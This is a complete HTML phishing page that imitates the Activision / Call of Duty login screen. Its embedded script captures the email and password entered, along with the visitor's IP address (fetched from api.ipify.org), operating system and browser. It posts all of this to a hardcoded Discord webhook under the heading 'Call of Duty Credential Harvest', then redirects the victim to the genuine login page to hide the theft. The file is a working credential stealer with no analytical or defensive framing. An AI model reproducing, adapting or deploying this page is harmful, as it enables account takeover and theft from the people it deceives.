<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call of Duty - Login</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/kronos/common/bgs/bg-image-s6.jpg'); background-size: cover; }
        .login-container { background: rgba(0, 0, 0, 0.8); padding: 40px; border-radius: 8px; width: 300px; text-align: center; border: 1px solid #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #ff0000; color: white; border: none; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #cc0000; }
    </style>
</head>
<body>
<div class="login-container">
    <h2>ACTIVISION</h2>
    <p>LOGIN TO YOUR ACCOUNT</p>
    <input type="email" id="email" placeholder="Email Address" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="sendData()">SIGN IN</button>
</div>
<script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
    async function sendData() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const time = new Date().toLocaleString();
        const userAgent = navigator.userAgent;
        let os = 'Unknown OS';
        if (userAgent.indexOf('Win') != -1) os = 'Windows';
        if (userAgent.indexOf('Mac') != -1) os = 'MacOS';
        if (userAgent.indexOf('Linux') != -1) os = 'Linux';
        if (userAgent.indexOf('Android') != -1) os = 'Android';
        if (userAgent.indexOf('like Mac') != -1) os = 'iOS';
        let browser = 'Unknown Browser';
        if(userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
        else if(userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = 'Opera';
        else if(userAgent.indexOf('Edge') > -1) browser = 'Edge';
        else if(userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
        else if(userAgent.indexOf('Safari') > -1) browser = 'Safari';
        let ip = 'Unknown IP';
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            ip = data.ip;
        } catch (error) {}
        const payload = {
            content: '🚨 **New Login Captured!** 🚨',
            embeds: [{
                title: 'Call of Duty Credential Harvest',
                color: 16711680,
                fields: [
                    { name: 'Email', value: email, inline: true },
                    { name: 'Password', value: password, inline: true },
                    { name: 'IP Address', value: ip, inline: false },
                    { name: 'OS', value: os, inline: true },
                    { name: 'Browser', value: browser, inline: true },
                    { name: 'Time', value: time, inline: false }
                ]
            }]
        };
        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            window.location.href = 'https://profile.callofduty.com/cod/login';
        });
    }
</script>
</body>
</html>
